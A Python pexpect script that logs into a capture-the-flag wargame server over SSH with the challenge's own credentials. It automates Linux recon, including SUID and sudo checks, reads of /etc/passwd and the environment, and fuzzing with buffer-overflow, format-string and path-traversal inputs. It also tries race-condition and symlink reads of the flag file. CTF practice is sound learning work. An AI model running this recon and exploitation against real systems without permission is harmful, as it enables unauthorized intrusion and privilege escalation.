#!/usr/bin/env python3

import pexpect
import sys
import time

print("="*60)
print("DESTRUYENDO BASIC9 - PWN CHALLENGE")
print("="*60)

# Credenciales
host = "pwn.w3challs.com"
port = 10101
user = "basic9"
password = "basic9"

print(f"\n[*] Conectando a {user}@{host}:{port}")

# Conectar por SSH
ssh_cmd = f"ssh -o StrictHostKeyChecking=no -p {port} {user}@{host}"
child = pexpect.spawn(ssh_cmd, encoding='utf-8', timeout=30)

try:
    # Esperar password prompt
    index = child.expect(['password:', 'Password:', pexpect.EOF, pexpect.TIMEOUT])
    if index in [0, 1]:
        print("[*] Enviando password...")
        child.sendline(password)
    else:
        print("[!] No se solicitó password")
        sys.exit(1)
    
    # Esperar shell prompt
    child.expect(['\\$', '#', '>', pexpect.EOF, pexpect.TIMEOUT])
    print("[✓] Conectado exitosamente!")
    
    # Comandos de reconocimiento
    commands = [
        ("whoami", "Verificar usuario"),
        ("id", "Ver permisos"),
        ("pwd", "Directorio actual"),
        ("ls -la", "Listar archivos"),
        ("ls -la /home/basic9/", "Listar home"),
        ("file /home/basic9/*", "Tipo de archivos"),
        ("cat /home/basic9/flag 2>&1", "Intentar leer flag directamente"),
        ("ls -la /home/basic9/flag", "Permisos de flag"),
        ("find /home/basic9 -type f -readable 2>/dev/null", "Archivos legibles"),
        ("find . -perm -4000 2>/dev/null", "Buscar SUID"),
        ("sudo -l 2>&1", "Verificar sudo"),
        ("cat /etc/passwd | grep basic", "Usuarios basic"),
        ("uname -a", "Info del sistema"),
        ("ls -la /tmp", "Directorio tmp"),
        ("env", "Variables de entorno")
    ]
    
    print("\n[*] Ejecutando reconocimiento...")
    print("-"*40)
    
    for cmd, desc in commands:
        print(f"\n[>] {desc}: {cmd}")
        child.sendline(cmd)
        child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
        output = child.before.strip()
        if output:
            # Limpiar output
            lines = output.split('\n')
            for line in lines[1:]:  # Saltar la primera línea que es el comando
                if line.strip():
                    print(f"    {line}")
    
    # Buscar binarios vulnerables
    print("\n[*] Buscando binarios vulnerables...")
    child.sendline("find /home/basic9 -type f -executable 2>/dev/null")
    child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
    executables = child.before.strip().split('\n')[1:]
    
    for exe in executables:
        if exe.strip() and not exe.startswith('find'):
            print(f"\n[*] Analizando: {exe.strip()}")
            
            # Ver strings del binario
            child.sendline(f"strings {exe.strip()} 2>/dev/null | head -20")
            child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
            
            # Intentar ejecutarlo
            child.sendline(f"{exe.strip()} 2>&1")
            child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
            output = child.before.strip()
            if "flag" in output.lower() or "password" in output.lower():
                print(f"[!] Salida interesante: {output}")
    
    # Buscar archivos con permisos especiales
    print("\n[*] Buscando archivos con permisos especiales...")
    child.sendline("find /home/basic9 -type f \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null")
    child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
    suid_files = child.before.strip().split('\n')[1:]
    
    for suid in suid_files:
        if suid.strip():
            print(f"[!] SUID/SGID encontrado: {suid.strip()}")
            
            # Analizar el binario SUID
            child.sendline(f"file {suid.strip()}")
            child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
            
            child.sendline(f"ls -la {suid.strip()}")
            child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
            perms = child.before.strip()
            print(f"    Permisos: {perms}")
    
    # Intentar técnicas comunes de PWN
    print("\n[*] Probando técnicas de explotación...")
    
    # 1. Buffer overflow simple
    print("\n[1] Probando buffer overflow...")
    payloads = [
        "A" * 100,
        "A" * 1000,
        "A" * 10000,
        "%x" * 50,  # Format string
        "../" * 20 + "flag",  # Path traversal
    ]
    
    # Buscar el binario vulnerable
    child.sendline("ls -la /home/basic9/ | grep -E '^-..x'")
    child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
    exe_output = child.before.strip().split('\n')[1:]
    
    target_binary = None
    for line in exe_output:
        if line.strip() and 'flag' not in line:
            parts = line.split()
            if len(parts) >= 9:
                binary_name = parts[-1]
                if binary_name != 'flag':
                    target_binary = f"/home/basic9/{binary_name}"
                    print(f"[!] Binario objetivo encontrado: {target_binary}")
                    break
    
    if target_binary:
        for i, payload in enumerate(payloads):
            print(f"\n[*] Payload {i+1}: {payload[:50]}...")
            
            # Probar como argumento
            child.sendline(f"{target_binary} '{payload}' 2>&1")
            child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=2)
            output = child.before.strip()
            
            if "flag" in output.lower() or "W3C" in output:
                print(f"[!] FLAG ENCONTRADA: {output}")
                break
            
            # Probar como input
            child.sendline(f"echo '{payload}' | {target_binary} 2>&1")
            child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=2)
            output = child.before.strip()
            
            if "flag" in output.lower() or "W3C" in output:
                print(f"[!] FLAG ENCONTRADA: {output}")
                break
    
    # 2. Explotar race condition
    print("\n[2] Probando race condition...")
    child.sendline("for i in {1..10}; do cat /home/basic9/flag 2>/dev/null & done; wait")
    child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
    
    # 3. Symlink attack
    print("\n[3] Probando symlink...")
    child.sendline("ln -sf /home/basic9/flag /tmp/mylink 2>/dev/null; cat /tmp/mylink 2>&1")
    child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
    output = child.before.strip()
    if "W3C" in output or len(output) > 10:
        print(f"[!] FLAG: {output}")
    
    # 4. Verificar si hay algún script o binario que lea la flag
    print("\n[4] Buscando referencias a flag...")
    child.sendline("grep -r 'flag' /home/basic9/ 2>/dev/null")
    child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
    
    # Comando final de emergencia
    print("\n[*] Intento final...")
    child.sendline("cat /home/basic9/flag || cat flag || ./flag || /home/basic9/flag")
    child.expect(['\\$', '#', '>', pexpect.TIMEOUT], timeout=5)
    final_output = child.before.strip()
    
    if final_output and "command not found" not in final_output.lower():
        print(f"\n[!] Salida final: {final_output}")
        
        # Buscar patrones de flag
        import re
        flag_patterns = [
            r'W3C{[^}]+}',
            r'flag{[^}]+}',
            r'FLAG{[^}]+}',
            r'[A-Za-z0-9]{20,}',  # String largo que podría ser flag
        ]
        
        for pattern in flag_patterns:
            match = re.search(pattern, final_output)
            if match:
                print(f"\n🔥🔥🔥 FLAG ENCONTRADA: {match.group(0)} 🔥🔥🔥")
                break
    
except pexpect.exceptions.TIMEOUT:
    print("[!] Timeout en la conexión")
except Exception as e:
    print(f"[!] Error: {e}")
finally:
    child.close()

print("\n" + "="*60)
print("FIN DEL ATAQUE")
print("="*60)